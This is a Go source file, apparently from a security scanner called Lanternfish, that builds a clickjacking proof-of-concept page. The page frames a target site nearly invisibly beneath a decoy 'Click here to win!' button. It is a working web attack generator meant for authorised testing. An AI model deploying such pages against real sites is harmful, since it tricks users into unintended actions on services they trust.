// Package clickjack generates a clickjacking proof-of-concept page that frames
// a target under a decoy overlay, the equivalent of Burp's Clickbandit. The
// PoC only works if the target does not forbid framing (no X-Frame-Options and
// no CSP frame-ancestors), which Lanternfish's scanner reports separately.
package clickjack

import (
	"fmt"
	"html"
	"strings"
)

// Generate returns a standalone HTML clickjacking PoC that frames target with a
// semi-transparent decoy overlay. opacity is the iframe opacity (0..1); a low
// value shows the decoy, 1.0 reveals the framed target for demonstration.
func Generate(target string, opacity float64) string {
	if opacity <= 0 || opacity > 1 {
		opacity = 0.1
	}
	t := html.EscapeString(target)
	var b strings.Builder
	b.WriteString("<!doctype html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<title>Lanternfish Clickbandit PoC</title>\n<style>\n")
	b.WriteString("body{margin:0;font-family:system-ui,sans-serif}\n")
	b.WriteString("#decoy{position:absolute;top:0;left:0;width:100%;height:100%;z-index:1}\n")
	b.WriteString(".bait{position:absolute;padding:12px 20px;background:#e8743b;color:#fff;border-radius:6px;font-size:18px;cursor:pointer}\n")
	fmt.Fprintf(&b, "#target{position:absolute;top:0;left:0;width:100%%;height:100%%;z-index:2;opacity:%.2f;border:0}\n", opacity)
	b.WriteString("</style>\n</head>\n<body>\n")
	b.WriteString("<!-- Lanternfish clickjacking PoC. Works only if the target allows framing. -->\n")
	b.WriteString("<div id=\"decoy\">\n")
	b.WriteString("  <div class=\"bait\" style=\"top:120px;left:60px\">Click here to win!</div>\n")
	b.WriteString("  <p style=\"padding:20px;color:#888\">Decoy page — position the bait over a sensitive control in the framed target.</p>\n")
	b.WriteString("</div>\n")
	fmt.Fprintf(&b, "<iframe id=\"target\" src=\"%s\"></iframe>\n", t)
	b.WriteString("</body>\n</html>\n")
	return b.String()
}
